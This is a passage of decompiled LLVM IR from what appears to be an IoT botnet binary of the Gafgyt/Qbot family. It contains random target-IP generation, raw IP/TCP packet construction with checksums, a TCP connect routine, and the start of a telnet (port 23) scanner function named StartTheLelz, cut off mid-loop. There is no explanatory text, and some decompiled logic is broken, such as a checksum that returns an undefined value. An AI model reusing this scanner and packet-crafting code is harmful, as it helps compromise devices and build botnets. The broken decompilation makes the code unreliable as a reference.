  %v4_10003454 = call i32 @szprintf(i32 %v2_100033f4, i32 ptrtoint ([12 x i8]* @global_var_10011c68.53 to i32), i32 %v4_10003130)
  store i32 268448868, i32* @lr, align 4
  %v1_10003460 = call i32 @inet_addr(i32 %v2_100033f4)
  ret i32 %v1_10003460

; uselistorder directives
  uselistorder i32 %v2_100033f4, { 1, 0 }
  uselistorder i32* %stack_var_-56, { 1, 0 }
  uselistorder i8* @global_var_10024a42.51, { 1, 0 }
  uselistorder i8* @global_var_10024a41.50, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_10024a40.49, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100032bc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10003280, { 1, 0 }
  uselistorder label %dec_label_pc_10003258, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000321c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_100031e0, { 1, 0 }
  uselistorder label %dec_label_pc_1000312c, { 1, 0 }
}

define i32 @GetRandomIP(i32 %arg1) local_unnamed_addr {
entry:
  %v3_100034a0 = load i32, i32* @global_var_10024a48.54, align 4
  store i32 %v3_100034a0, i32* @r3, align 4
  %v2_100034a8 = call i32 @ntohl(i32 %v3_100034a0, i32 268566528)
  %v2_100034b4 = and i32 %v2_100034a8, %arg1
  %v0_100034bc = call i32 @rand_cmwc()
  %v1_100034c8 = sub i32 -1, %arg1
  %v2_100034cc = and i32 %v0_100034bc, %v1_100034c8
  %v2_100034d4 = xor i32 %v2_100034cc, %v2_100034b4
  ret i32 %v2_100034d4
}

define i32 @csum(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %tmp21 = call i16 @__decompiler_undefined_function_4()
  %v2_100035643 = icmp sgt i32 %arg2, 1
  br i1 %v2_100035643, label %dec_label_pc_1000351c, label %dec_label_pc_1000356c

dec_label_pc_1000351c:                            ; preds = %entry, %dec_label_pc_1000351c
  %stack_var_-24.08 = phi i16* [ %v5_10003550, %dec_label_pc_1000351c ], [ %arg1, %entry ]
  %stack_var_-20.07 = phi i32 [ %v1_10003558, %dec_label_pc_1000351c ], [ %arg2, %entry ]
  %stack_var_-16.06 = phi i32 [ %v5_1000353c, %dec_label_pc_1000351c ], [ 0, %entry ]
  %stack_var_-12.05 = phi i32 [ %v2_10003538, %dec_label_pc_1000351c ], [ 0, %entry ]
  %v4_1000351c = ptrtoint i16* %stack_var_-24.08 to i32
  %v2_10003520 = load i16, i16* %stack_var_-24.08, align 2
  %v3_10003520 = zext i16 %v2_10003520 to i32
  %v2_10003538 = add i32 %v3_10003520, %stack_var_-12.05
  %v3_10003538 = icmp ult i32 %v2_10003538, %stack_var_-12.05
  %v4_1000353c = zext i1 %v3_10003538 to i32
  %v5_1000353c = add i32 %v4_1000353c, %stack_var_-16.06
  %v1_1000354c = add i32 %v4_1000351c, 2
  %v5_10003550 = inttoptr i32 %v1_1000354c to i16*
  %v1_10003558 = add nsw i32 %stack_var_-20.07, -2
  %v2_10003564 = icmp sgt i32 %v1_10003558, 1
  br i1 %v2_10003564, label %dec_label_pc_1000351c, label %dec_label_pc_10003560.dec_label_pc_1000356c_crit_edge

dec_label_pc_10003560.dec_label_pc_1000356c_crit_edge: ; preds = %dec_label_pc_1000351c
  %v3_10003564.le = icmp eq i32 %v1_10003558, 1
  br i1 %v3_10003564.le, label %dec_label_pc_10003578, label %dec_label_pc_100035e4.preheader

dec_label_pc_1000356c:                            ; preds = %entry
  %v3_100035644 = icmp eq i32 %arg2, 1
  br i1 %v3_100035644, label %dec_label_pc_10003578, label %dec_label_pc_100035e4.preheader

dec_label_pc_10003578:                            ; preds = %dec_label_pc_10003560.dec_label_pc_1000356c_crit_edge, %dec_label_pc_1000356c
  %stack_var_-24.0.lcssa20 = phi i16* [ %v5_10003550, %dec_label_pc_10003560.dec_label_pc_1000356c_crit_edge ], [ %arg1, %dec_label_pc_1000356c ]
  %stack_var_-16.0.lcssa19 = phi i32 [ %v5_1000353c, %dec_label_pc_10003560.dec_label_pc_1000356c_crit_edge ], [ 0, %dec_label_pc_1000356c ]
  %stack_var_-12.0.lcssa18 = phi i32 [ %v2_10003538, %dec_label_pc_10003560.dec_label_pc_1000356c_crit_edge ], [ 0, %dec_label_pc_1000356c ]
  %v1_1000357c = bitcast i16* %stack_var_-24.0.lcssa20 to i8*
  %v2_1000357c = load i8, i8* %v1_1000357c, align 1
  %v3_1000357c = zext i8 %v2_1000357c to i32
  %v2_10003594 = add i32 %v3_1000357c, %stack_var_-12.0.lcssa18
  %v3_10003594 = icmp ult i32 %v2_10003594, %stack_var_-12.0.lcssa18
  %v4_10003598 = zext i1 %v3_10003594 to i32
  %v5_10003598 = add i32 %v4_10003598, %stack_var_-16.0.lcssa19
  br label %dec_label_pc_100035e4.preheader

dec_label_pc_100035e4.preheader:                  ; preds = %dec_label_pc_10003560.dec_label_pc_1000356c_crit_edge, %dec_label_pc_10003578, %dec_label_pc_1000356c
  %stack_var_-12.1.ph = phi i32 [ %v2_10003538, %dec_label_pc_10003560.dec_label_pc_1000356c_crit_edge ], [ 0, %dec_label_pc_1000356c ], [ %v2_10003594, %dec_label_pc_10003578 ]
  %stack_var_-16.1.ph = phi i32 [ %v5_1000353c, %dec_label_pc_10003560.dec_label_pc_1000356c_crit_edge ], [ 0, %dec_label_pc_1000356c ], [ %v5_10003598, %dec_label_pc_10003578 ]
  %v1_100035e829 = mul i32 %stack_var_-16.1.ph, 65536
  %v1_100035f030 = udiv i32 %stack_var_-12.1.ph, 65536
  %v2_100035f431 = or i32 %v1_100035e829, %v1_100035f030
  %v1_100035fc32 = udiv i32 %stack_var_-16.1.ph, 65536
  %v2_1000360433 = or i32 %v2_100035f431, %v1_100035fc32
  %v3_1000360834 = icmp eq i32 %v2_1000360433, 0
  br i1 %v3_1000360834, label %dec_label_pc_10003610, label %dec_label_pc_100035a8

dec_label_pc_100035a8:                            ; preds = %dec_label_pc_100035e4.preheader, %dec_label_pc_100035a8
  %v1_100035fc37 = phi i32 [ %v1_100035fc, %dec_label_pc_100035a8 ], [ %v1_100035fc32, %dec_label_pc_100035e4.preheader ]
  %v2_100035f436 = phi i32 [ %v2_100035f4, %dec_label_pc_100035a8 ], [ %v2_100035f431, %dec_label_pc_100035e4.preheader ]
  %stack_var_-12.135 = phi i32 [ %v2_100035d4, %dec_label_pc_100035a8 ], [ %stack_var_-12.1.ph, %dec_label_pc_100035e4.preheader ]
  %v1_100035b4 = urem i32 %stack_var_-12.135, 65536
  %v2_100035d4 = add i32 %v2_100035f436, %v1_100035b4
  %v3_100035d4 = icmp ult i32 %v2_100035d4, %v1_100035b4
  %v4_100035d8 = zext i1 %v3_100035d4 to i32
  %v5_100035d8 = add nuw nsw i32 %v4_100035d8, %v1_100035fc37
  %v1_100035e8 = mul i32 %v5_100035d8, 65536
  %v1_100035f0 = udiv i32 %v2_100035d4, 65536
  %v2_100035f4 = or i32 %v1_100035e8, %v1_100035f0
  %v1_100035fc = udiv i32 %v5_100035d8, 65536
  %v2_10003604 = or i32 %v2_100035f4, %v1_100035fc
  %v3_10003608 = icmp eq i32 %v2_10003604, 0
  br i1 %v3_10003608, label %dec_label_pc_100035e4.dec_label_pc_10003610_crit_edge, label %dec_label_pc_100035a8

dec_label_pc_100035e4.dec_label_pc_10003610_crit_edge: ; preds = %dec_label_pc_100035a8
  br label %dec_label_pc_10003610

dec_label_pc_10003610:                            ; preds = %dec_label_pc_100035e4.dec_label_pc_10003610_crit_edge, %dec_label_pc_100035e4.preheader
  %v4_10003610 = zext i16 %tmp21 to i32
  %v1_1000361c = xor i32 %v4_10003610, 65535
  ret i32 %v1_1000361c

; uselistorder directives
  uselistorder i32 %v2_100035f4, { 1, 0 }
  uselistorder i32 %v5_100035d8, { 1, 0 }
  uselistorder i32 %v2_100035d4, { 0, 2, 1 }
  uselistorder i32 %v1_100035fc32, { 1, 0 }
  uselistorder i32 %stack_var_-16.1.ph, { 1, 0 }
  uselistorder i32 %stack_var_-12.1.ph, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.lcssa18, { 1, 0 }
  uselistorder i32 %v1_10003558, { 0, 2, 1 }
  uselistorder i32 %v2_10003538, { 0, 1, 3, 2 }
  uselistorder i32 %stack_var_-12.05, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100035a8, { 1, 0 }
  uselistorder label %dec_label_pc_100035e4.preheader, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10003578, { 1, 0 }
  uselistorder label %dec_label_pc_1000351c, { 1, 0 }
}

define i32 @tcpcsum(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-64 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10003634 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10003634, i32* %stack_var_-64, align 4
  store i32 %arg1, i32* %r9.global-to-local, align 4
  %v1_10003660 = add i32 %arg1, 12
  %v2_10003660 = inttoptr i32 %v1_10003660 to i32*
  %v3_10003660 = load i32, i32* %v2_10003660, align 4
  store i32 %arg1, i32* %r9.global-to-local, align 4
  %v1_1000366c = add i32 %arg1, 16
  %v2_1000366c = inttoptr i32 %v1_1000366c to i32*
  %v3_1000366c = load i32, i32* %v2_1000366c, align 4
  store i32 20, i32* @r3, align 4
  %v1_10003688 = call i32 @htons(i32 20)
  store i32 32, i32* @r3, align 4
  store i32 268449448, i32* @lr, align 4
  %v0_100036a4 = call i32 @malloc()
  store i32 %v0_100036a4, i32* %r11.global-to-local, align 4
  store i32 %v3_1000366c, i32* %r10.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_100036c4 = inttoptr i32 %v0_100036a4 to i32*
  store i32 %v3_10003660, i32* %v2_100036c4, align 4
  %v0_100036c8 = load i32, i32* %r10.global-to-local, align 4
  %v1_100036c8 = load i32, i32* %r11.global-to-local, align 4
  %v2_100036c8 = add i32 %v1_100036c8, 4
  %v3_100036c8 = inttoptr i32 %v2_100036c8 to i32*
  store i32 %v0_100036c8, i32* %v3_100036c8, align 4
  %v0_100036cc = load i32, i32* %r9.global-to-local, align 4
  %v1_100036cc = load i32, i32* %r11.global-to-local, align 4
  %v2_100036cc = add i32 %v1_100036cc, 8
  %v3_100036cc = inttoptr i32 %v2_100036cc to i32*
  store i32 %v0_100036cc, i32* %v3_100036cc, align 4
  %v1_100036d4 = add i32 %v0_100036a4, 12
  store i32 %v1_100036d4, i32* %r11.global-to-local, align 4
  store i32 %tmp, i32* %r9.global-to-local, align 4
  %v2_100036dc = load i32, i32* %arg2, align 4
  %v1_100036e0 = add i32 %tmp, 4
  %v2_100036e0 = inttoptr i32 %v1_100036e0 to i32*
  %v3_100036e0 = load i32, i32* %v2_100036e0, align 4
  store i32 %v3_100036e0, i32* %r10.global-to-local, align 4
  %v1_100036e4 = add i32 %tmp, 8
  %v2_100036e4 = inttoptr i32 %v1_100036e4 to i32*
  %v3_100036e4 = load i32, i32* %v2_100036e4, align 4
  %v1_100036e8 = add i32 %tmp, 12
  %v2_100036e8 = inttoptr i32 %v1_100036e8 to i32*
  %v3_100036e8 = load i32, i32* %v2_100036e8, align 4
  %v2_100036ec = inttoptr i32 %v1_100036d4 to i32*
  store i32 %v2_100036dc, i32* %v2_100036ec, align 4
  %v0_100036f0 = load i32, i32* %r10.global-to-local, align 4
  %v1_100036f0 = load i32, i32* %r11.global-to-local, align 4
  %v2_100036f0 = add i32 %v1_100036f0, 4
  %v3_100036f0 = inttoptr i32 %v2_100036f0 to i32*
  store i32 %v0_100036f0, i32* %v3_100036f0, align 4
  %v1_100036f4 = load i32, i32* %r11.global-to-local, align 4
  %v2_100036f4 = add i32 %v1_100036f4, 8
  %v3_100036f4 = inttoptr i32 %v2_100036f4 to i32*
  store i32 %v3_100036e4, i32* %v3_100036f4, align 4
  %v1_100036f8 = load i32, i32* %r11.global-to-local, align 4
  %v2_100036f8 = add i32 %v1_100036f8, 12
  %v3_100036f8 = inttoptr i32 %v2_100036f8 to i32*
  store i32 %v3_100036e8, i32* %v3_100036f8, align 4
  %v1_100036fc = add i32 %tmp, 16
  %v2_100036fc = inttoptr i32 %v1_100036fc to i32*
  %v3_100036fc = load i32, i32* %v2_100036fc, align 4
  %v1_10003700 = load i32, i32* %r11.global-to-local, align 4
  %v2_10003700 = add i32 %v1_10003700, 16
  %v3_10003700 = inttoptr i32 %v2_10003700 to i32*
  store i32 %v3_100036fc, i32* %v3_10003700, align 4
  %v5_1000370c = inttoptr i32 %v0_100036a4 to i16*
  %v6_1000370c = call i32 @csum(i16* %v5_1000370c, i32 32, i32 %v3_100036e8, i32 %v3_100036e4, i32 %tmp)
  %sext = mul i32 %v6_1000370c, 65536
  %v1_10003710 = sdiv i32 %sext, 65536
  store i32 %v0_100036a4, i32* @r3, align 4
  store i32 268449568, i32* @lr, align 4
  %v0_1000371c = call i32 @free()
  %v1_10003724 = urem i32 %v1_10003710, 65536
  %v2_1000372c = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_1000372c, i32* %r11.global-to-local, align 4
  ret i32 %v1_10003724

; uselistorder directives
  uselistorder i32 %v0_100036a4, { 3, 2, 1, 0, 4 }
  uselistorder i32 %tmp, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 4, 2, 3, 5, 6, 7, 8 }
}

define i32 @makeIPPacket(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg4 to i8
  %tmp1 = ptrtoint i32* %arg1 to i32
  %v1_1000377c = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 %v1_1000377c, i32* %arg1, align 4
  %v1_10003790 = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_10003790, i32* %arg1, align 4
  %v3_100037a0 = add i32 %tmp1, 1
  %v4_100037a0 = inttoptr i32 %v3_100037a0 to i8*
  store i8 0, i8* %v4_100037a0, align 1
  %fold = add i32 %arg5, 20
  %v1_100037b8 = trunc i32 %fold to i16
  %v3_100037b8 = add i32 %tmp1, 2
  %v4_100037b8 = inttoptr i32 %v3_100037b8 to i16*
  store i16 %v1_100037b8, i16* %v4_100037b8, align 2
  %v0_100037bc = call i32 @rand_cmwc()
  %v1_100037cc = trunc i32 %v0_100037bc to i16
  %v3_100037cc = add i32 %tmp1, 4
  %v4_100037cc = inttoptr i32 %v3_100037cc to i16*
  store i16 %v1_100037cc, i16* %v4_100037cc, align 2
  %v3_100037d8 = add i32 %tmp1, 6
  %v4_100037d8 = inttoptr i32 %v3_100037d8 to i16*
  store i16 0, i16* %v4_100037d8, align 2
  %v3_100037e4 = add i32 %tmp1, 8
  %v4_100037e4 = inttoptr i32 %v3_100037e4 to i8*
  store i8 -1, i8* %v4_100037e4, align 1
  %v3_100037f0 = add i32 %tmp1, 9
  %v4_100037f0 = inttoptr i32 %v3_100037f0 to i8*
  store i8 %tmp, i8* %v4_100037f0, align 1
  %v3_100037fc = add i32 %tmp1, 10
  %v4_100037fc = inttoptr i32 %v3_100037fc to i16*
  store i16 0, i16* %v4_100037fc, align 2
  %v2_10003808 = add i32 %tmp1, 12
  %v3_10003808 = inttoptr i32 %v2_10003808 to i32*
  store i32 %arg3, i32* %v3_10003808, align 4
  %v2_10003814 = add i32 %tmp1, 16
  %v3_10003814 = inttoptr i32 %v2_10003814 to i32*
  store i32 %arg2, i32* %v3_10003814, align 4
  ret i32 %v0_100037bc
}

define i32 @sclose(i32 %arg1) local_unnamed_addr {
entry:
  %v2_1000384c = icmp sgt i32 %arg1, 2
  br i1 %v2_1000384c, label %dec_label_pc_10003860, label %dec_label_pc_10003870

dec_label_pc_10003860:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_10003868.55 to i32), i32* @lr, align 4
  %v1_10003864 = call i32 @__libc_close(i32 %arg1)
  br label %dec_label_pc_10003870

dec_label_pc_10003870:                            ; preds = %entry, %dec_label_pc_10003860
  %storemerge = phi i32 [ 0, %dec_label_pc_10003860 ], [ 1, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder label %dec_label_pc_10003870, { 1, 0 }
}

define i32 @socket_connect(i32 %arg1, i16 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  store i32 1, i32* %stack_var_-32, align 4
  store i32 268449984, i32* @lr, align 4
  %v1_100038bc = call i32 @__GI_gethostbyname(i32 %arg1)
  %v3_100038cc = icmp eq i32 %v1_100038bc, 0
  br i1 %v3_100038cc, label %dec_label_pc_100038d4, label %dec_label_pc_100038e0

dec_label_pc_100038d4:                            ; preds = %entry
  br label %dec_label_pc_100039b8

dec_label_pc_100038e0:                            ; preds = %entry
  %v1_100038e4 = add i32 %v1_100038bc, 16
  %v2_100038e4 = inttoptr i32 %v1_100038e4 to i32*
  %v3_100038e4 = load i32, i32* %v2_100038e4, align 4
  %v1_100038e8 = inttoptr i32 %v3_100038e4 to i32*
  %v2_100038e8 = load i32, i32* %v1_100038e8, align 4
  %v1_100038f0 = add i32 %v1_100038bc, 12
  %v2_100038f0 = inttoptr i32 %v1_100038f0 to i32*
  %v3_100038f0 = load i32, i32* %v2_100038f0, align 4
  %v2_100038f8 = ptrtoint i32* %stack_var_-48 to i32
  %v2_100038fc = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v3_100038f0, i32* @r5, align 4
  store i32 268450064, i32* @lr, align 4
  %v4_1000390c = call i32 @bcopy(i32 %v2_100038e8, i32 %v2_100038fc, i32 %v3_100038f0, i32 %v2_100038f8)
  %v4_10003910 = zext i16 %arg2 to i32
  store i32 %v4_10003910, i32* @r3, align 4
  %v1_1000391c = call i32 @htons(i32 %v4_10003910)
  store i32 2, i32* %stack_var_-48, align 4
  store i32 268450112, i32* @lr, align 4
  %v3_1000393c = call i32 @socket(i32 2, i32 1, i32 6)
  %v2_10003948 = ptrtoint i32* %stack_var_-32 to i32
  store i32 268450148, i32* @lr, align 4
  %v5_10003960 = call i32 @__GI_setsockopt(i32 %v3_1000393c, i32 6, i32 1, i32 %v2_10003948, i32 4)
  %v4_1000396c = icmp eq i32 %v3_1000393c, -1
  br i1 %v4_1000396c, label %dec_label_pc_10003974, label %dec_label_pc_10003980

dec_label_pc_10003974:                            ; preds = %dec_label_pc_100038e0
  br label %dec_label_pc_100039b8

dec_label_pc_10003980:                            ; preds = %dec_label_pc_100038e0
  store i32 268450196, i32* @lr, align 4
  %v3_10003990 = call i32 @__libc_connect(i32 %v3_1000393c, i32 %v2_100038f8, i32 16)
  %v4_1000399c = icmp eq i32 %v3_10003990, -1
  br i1 %v4_1000399c, label %dec_label_pc_100039a4, label %dec_label_pc_100039b0

dec_label_pc_100039a4:                            ; preds = %dec_label_pc_10003980
  br label %dec_label_pc_100039b8

dec_label_pc_100039b0:                            ; preds = %dec_label_pc_10003980
  br label %dec_label_pc_100039b8

dec_label_pc_100039b8:                            ; preds = %dec_label_pc_100039a4, %dec_label_pc_10003974, %dec_label_pc_100038d4, %dec_label_pc_100039b0
  %stack_var_-16.0 = phi i32 [ 0, %dec_label_pc_100038d4 ], [ 0, %dec_label_pc_10003974 ], [ 0, %dec_label_pc_100039a4 ], [ %v3_1000393c, %dec_label_pc_100039b0 ]
  ret i32 %stack_var_-16.0

; uselistorder directives
  uselistorder i32 %v2_100038f8, { 1, 0 }
  uselistorder i32 %v3_100038f0, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder label %dec_label_pc_100039b8, { 3, 0, 1, 2 }
}

define i32 @StartTheLelz(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-640 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_100039d8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_100039d8, i32* %stack_var_-640, align 4
  store i32 268450316, i32* @lr, align 4
  %v1_10003a08 = call i32 @__GI_time(i32 0)
  %v0_10003a14 = call i32 @rand_cmwc()
  %v2_10003a1c = xor i32 %v1_10003a08, %v0_10003a14
  store i32 ptrtoint (i32* @global_var_10003a28.56 to i32), i32* @lr, align 4
  %v1_10003a24 = call i32 @srand(i32 %v2_10003a1c)
  store i32 2, i32* %stack_var_-60, align 4
  store i32 23, i32* @r3, align 4
  %v1_10003a34 = call i32 @htons(i32 23)
  %v2_10003a44 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_10003a44, i32* %r9.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 1025, i32* @r3, align 4
  store i32 268450400, i32* @lr, align 4
  %v0_10003a5c = call i32 @malloc()
  store i32 1025, i32* %r9.global-to-local, align 4
  store i32 268450432, i32* @lr, align 4
  %v3_10003a7c = call i32 @__GI_memset(i32 %v0_10003a5c, i32 0, i32 1025)
  %v1_10003a84 = mul i32 %arg2, 28
  %v1_10003a8c = add i32 %v1_10003a84, 30
  %v1_10003a90 = and i32 %v1_10003a8c, -16
  %v2_10003a98 = load i32, i32* %stack_var_-640, align 4
  %v1_10003aa0 = load i32, i32* @r1, align 4
  %v3_10003aa0 = sub i32 %v1_10003aa0, %v1_10003a90
  %v4_10003aa0 = inttoptr i32 %v3_10003aa0 to i32*
  store i32 %v2_10003a98, i32* %v4_10003aa0, align 4
  %v1_10003ab0 = add i32 %v3_10003aa0, 23
  %v1_10003ab4 = and i32 %v1_10003ab0, -16
  store i32 %v1_10003ab4, i32* %r9.global-to-local, align 4
  %v1_10003ad0 = mul i32 %arg2, 5
  store i32 ptrtoint (i32* @global_var_10003ae4.57 to i32), i32* @lr, align 4
  %v3_10003ae0 = call i32 @__GI_memset(i32 %v1_10003ab4, i32 0, i32 %v1_10003ad0)
  store i32 %arg2, i32* %r9.global-to-local, align 4
  %v2_10003b8010 = icmp sgt i32 %arg2, 0
  br i1 %v2_10003b8010, label %dec_label_pc_10003af0, label %dec_label_pc_10003b88

dec_label_pc_10003af0:                            ; preds = %entry, %dec_label_pc_10003af0
  %storemerge313 = phi i32 [ %v1_10003b70, %dec_label_pc_10003af0 ], [ 0, %entry ]
  %v1_10003af8 = mul i32 %storemerge313, 28
  %v2_10003afc = add i32 %v1_10003af8, %v1_10003ab4
  store i32 %v2_10003afc, i32* %r9.global-to-local, align 4
  %v2_10003b04 = inttoptr i32 %v2_10003afc to i32*
  store i32 0, i32* %v2_10003b04, align 4
  %v1_10003b0c = load i32, i32* %r9.global-to-local, align 4
  %v2_10003b0c = add i32 %v1_10003b0c, 4
  %v3_10003b0c = inttoptr i32 %v2_10003b0c to i32*
  store i32 0, i32* %v3_10003b0c, align 4
  %v1_10003b14 = load i32, i32* %r9.global-to-local, align 4
  %v2_10003b14 = add i32 %v1_10003b14, 8
  %v3_10003b14 = inttoptr i32 %v2_10003b14 to i32*
  store i32 0, i32* %v3_10003b14, align 4
  %v1_10003b1c = load i32, i32* %r9.global-to-local, align 4
  %v2_10003b1c = add i32 %v1_10003b1c, 12
  %v3_10003b1c = inttoptr i32 %v2_10003b1c to i32*
  store i32 0, i32* %v3_10003b1c, align 4
  %v1_10003b24 = load i32, i32* %r9.global-to-local, align 4
  %v2_10003b24 = add i32 %v1_10003b24, 16
  %v3_10003b24 = inttoptr i32 %v2_10003b24 to i32*
  store i32 0, i32* %v3_10003b24, align 4
  %v1_10003b2c = load i32, i32* %r9.global-to-local, align 4
  %v2_10003b2c = add i32 %v1_10003b2c, 20
  %v3_10003b2c = inttoptr i32 %v2_10003b2c to i32*
  store i32 0, i32* %v3_10003b2c, align 4
  %v1_10003b34 = load i32, i32* %r9.global-to-local, align 4
  %v2_10003b34 = add i32 %v1_10003b34, 24
  %v3_10003b34 = inttoptr i32 %v2_10003b34 to i32*
  store i32 0, i32* %v3_10003b34, align 4
  %v3_10003b4c = add i32 %v2_10003afc, 9
  %v4_10003b4c = inttoptr i32 %v3_10003b4c to i8*
  store i8 1, i8* %v4_10003b4c, align 1
  %v1_10003b60 = add i32 %v2_10003afc, 24
  %v2_10003b68 = inttoptr i32 %v1_10003b60 to i32*
  store i32 %v0_10003a5c, i32* %v2_10003b68, align 4
  %v1_10003b70 = add nuw nsw i32 %storemerge313, 1
  store i32 %arg2, i32* %r9.global-to-local, align 4
  %v2_10003b80 = icmp slt i32 %v1_10003b70, %arg2
  br i1 %v2_10003b80, label %dec_label_pc_10003af0, label %dec_label_pc_10003b88

dec_label_pc_10003b88:                            ; preds = %dec_label_pc_10003af0, %entry
  br label %dec_label_pc_10003b90

dec_label_pc_10003b90:                            ; preds = %dec_label_pc_10003b90, %dec_label_pc_10003b88
  %stack_var_-604.0 = phi i32 [ 0, %dec_label_pc_10003b88 ], [ %v1_10003b94, %dec_label_pc_10003b90 ]
  %v1_10003b94 = add i32 %stack_var_-604.0, 1
  %v1_10003ba8 = mul i32 %v1_10003b94, 4
  %v2_10003bac = add i32 %v1_10003ba8, ptrtoint ([10 x i8*]* @global_var_10024608.68 to i32)
  store i32 %v2_10003bac, i32* %r9.global-to-local, align 4
  %v1_10003bb0 = inttoptr i32 %v2_10003bac to i32*
  %v2_10003bb0 = load i32, i32* %v1_10003bb0, align 4
  %v3_10003bb4 = icmp eq i32 %v2_10003bb0, 0
  br i1 %v3_10003bb4, label %dec_label_pc_10003bbc.preheader, label %dec_label_pc_10003b90

dec_label_pc_10003bbc.preheader:                  ; preds = %dec_label_pc_10003b90
  %v2_10003c04 = add i32 %v1_10003ab4, 16
  %v2_10003d18 = or i32 %v1_10003ab4, 4
  %v2_10003ea8 = ptrtoint i32* %stack_var_-60 to i32
  br label %dec_label_pc_10003bbc

dec_label_pc_10003bbc:                            ; preds = %dec_label_pc_10003bbc, %dec_label_pc_10004974, %dec_label_pc_10003bbc.preheader
  store i32 %arg2, i32* %r9.global-to-local, align 4
  br i1 %v2_10003b8010, label %dec_label_pc_10003bc8, label %dec_label_pc_10003bbc

dec_label_pc_10003bc8:                            ; preds = %dec_label_pc_10003bbc, %dec_label_pc_10004974
  %storemerge48 = phi i32 [ %v1_10004978, %dec_label_pc_10004974 ], [ 0, %dec_label_pc_10003bbc ]
  %v1_10003bd0 = mul i32 %storemerge48, 28
  %v2_10003bd4 = add i32 %v1_10003bd0, %v1_10003ab4
  %v1_10003bd8 = add i32 %v2_10003bd4, 16
  store i32 %v1_10003bd8, i32* %r9.global-to-local, align 4
  %v1_10003bdc = inttoptr i32 %v1_10003bd8 to i32*
  %v2_10003bdc = load i32, i32* %v1_10003bdc, align 4
  %v3_10003be0 = icmp eq i32 %v2_10003bdc, 0
  br i1 %v3_10003be0, label %dec_label_pc_10003be8, label %dec_label_pc_10003c10

dec_label_pc_10003be8:                            ; preds = %dec_label_pc_10003bc8
  store i32 268450804, i32* @lr, align 4
  %v1_10003bf0 = call i32 @__GI_time(i32 0)
  %v1_10003c00 = mul i32 %storemerge48, 28
  %v1_10003c08 = add i32 %v2_10003c04, %v1_10003c00
  store i32 %v1_10003c08, i32* %r9.global-to-local, align 4
  %v2_10003c0c = inttoptr i32 %v1_10003c08 to i32*
  store i32 %v1_10003bf0, i32* %v2_10003c0c, align 4
  br label %dec_label_pc_10003c10

dec_label_pc_10003c10:                            ; preds = %dec_label_pc_10003bc8, %dec_label_pc_10003be8
  store i32 %v2_10003bd4, i32* %r9.global-to-local, align 4
  %v1_10003c20 = add i32 %v2_10003bd4, 8
  %v2_10003c20 = inttoptr i32 %v1_10003c20 to i8*
  %v3_10003c20 = load i8, i8* %v2_10003c20, align 4
  %v2_10003c30 = icmp ugt i8 %v3_10003c20, 7
  br i1 %v2_10003c30, label %dec_label_pc_10004974, label %dec_label_pc_10003c38

dec_label_pc_10003c38:                            ; preds = %dec_label_pc_10003c10
  %v4_10003c20 = zext i8 %v3_10003c20 to i32
  %v1_10003c3c = mul nuw nsw i32 %v4_10003c20, 4
  %v2_10003c48 = add i32 %v1_10003c3c, ptrtoint (i32* @global_var_10011ce8.69 to i32)
  store i32 %v2_10003c48, i32* %r9.global-to-local, align 4
  %v1_10003c4c = inttoptr i32 %v2_10003c48 to i32*
  %v2_10003c4c = load i32, i32* %v1_10003c4c, align 4
  store i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32), i32* %r9.global-to-local, align 4
  %v2_10003c58 = add i32 %v2_10003c4c, ptrtoint (i32* @global_var_10011ce8.69 to i32)
  call void @__pseudo_branch(i32 %v2_10003c58)
  store i32 %v2_10003bd4, i32* %r9.global-to-local, align 4
  %v1_10003c74 = add i32 %v2_10003bd4, 9
  %v2_10003c74 = inttoptr i32 %v1_10003c74 to i8*
  %v3_10003c74 = load i8, i8* %v2_10003c74, align 1
  %v3_10003c7c = icmp eq i8 %v3_10003c74, 1
  store i32 %v1_10003ab4, i32* %r9.global-to-local, align 4
  br i1 %v3_10003c7c, label %dec_label_pc_10003c84, label %dec_label_pc_10003d28

dec_label_pc_10003c84:                            ; preds = %dec_label_pc_10003c38
  %v1_10003c94 = add i32 %v2_10003bd4, 24
  store i32 %v1_10003c94, i32* %r9.global-to-local, align 4
  %v1_10003c98 = inttoptr i32 %v1_10003c94 to i32*
  %v2_10003c98 = load i32, i32* %v1_10003c98, align 4
